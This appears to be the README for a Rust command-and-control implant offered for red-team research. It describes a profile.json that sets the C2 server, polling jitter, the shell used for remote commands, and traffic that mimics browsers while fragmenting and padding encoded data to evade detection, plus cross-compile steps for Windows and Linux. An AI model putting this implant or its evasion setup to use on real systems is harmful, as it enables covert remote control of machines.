**DISCLAIMER** — C2 (Command & Control) implant for **authorized security research only**.

# C2-Implant

Remote code execution agent written in Rust that communicates with the C2-Server using malleable profiles.

## Quick Start

```bash
cargo build --release
```


## Configuration

The implant loads configuration from `profile.json`, which defines:
- **C2 server URL and communication endpoints**
- **Jitter between command polls**
- **HTTP headers to mimic legitimate traffic**
- **Data encoding (serialization)**
- **Fragment distribution** across HTTP request/response
- **Padding/garbage data** to evade detection

### Profile Structure

The `client` section in `profile.json` configures the implant:

```json
{
  "client": {
    "api_url": "http://localhost:8000",
    "jitter_min": 10,
    "jitter_max": 15,
    "next_command_route": "/v1/analytics/batch",
    "command_response_route": "/v1/collect/i",
    "shell": "sh",
    "headers": {
      "User-Agent": "Mozilla/5.0 (...)",
      "Accept": "text/html,application/xhtml+xml"
    },
    "serializer": "hex",
    "chunk_size": 2,
    "fragments": [...],
    "garbages": [...],
    "command_id": {...}
  }
}
```

### Client Parameters

| Parameter | Type | Description |
|-----------|------|-------------|
| `api_url` | string | C2 server base URL (e.g., `http://c2.local:8000`) |
| `jitter_min` / `jitter_max` | int | Random sleep between polls (seconds) |
| `next_command_route` | string | Endpoint to fetch commands |
| `command_response_route` | string | Endpoint to submit command results |
| `shell` | string | Shell interpreter (`sh`, `bash`, `powershell`, `cmd.exe`) |
| `headers` | object | HTTP headers to mimic legitimate traffic |
| `serializer` | string | Encoding algorithm: `"hex"` or `"base64"` |
| `chunk_size` | int | Fragment size (bytes) before distribution |
| `fragments` | array | Define how data is split and distributed |
| `garbages` | array | Padding fields to mimic real application traffic |
| `command_id` | object | Location of command tracking ID in requests |

### Serializers

- **`hex`**: Hexadecimal encoding with ~50% random noise. Constant entropy, harder to detect statistically.
- **`base64`**: Base64 with variable noise framing. Format: `{noise}.{base64}.{noise}`

### Fragments

Fragments split encoded data across HTTP locations to evade regex-based detection.

```json
"fragments": [
  {"index": 0, "location": "cookie", "field": "seed"},
  {"index": 1, "location": "body", "field": "token"},
  {"index": 2, "location": "header", "field": "X-Data"}
]
```

**Locations**: `body`, `header`, `cookie`, `query`

Data is distributed cyclically in fragment index order.

### Garbages

Padding fields that mimic legitimate application data (audio chunks, sensor readings, metadata, etc.).

```json
"garbages": [
  {"location": "body", "field": "metadata", "garbage_type": "json_data"},
  {"location": "header", "field": "X-Timestamp", "garbage_type": "timestamp"}
]
```

**Available types**: `json_data`, `stream_header`, `timestamp`, `uuid`, `hex_data`, `random_string`, `audio_chunk`, `video_frame`, `numeric`

---

## Building

### Linux to Windows (MinGW)

```bash
rustup target add x86_64-pc-windows-gnu
cargo build --target x86_64-pc-windows-gnu --release
# Output: target/x86_64-pc-windows-gnu/release/Stonewave.exe
```

### Linux to Linux

```bash
cargo build --release
# Output: target/release/Stonewave
```

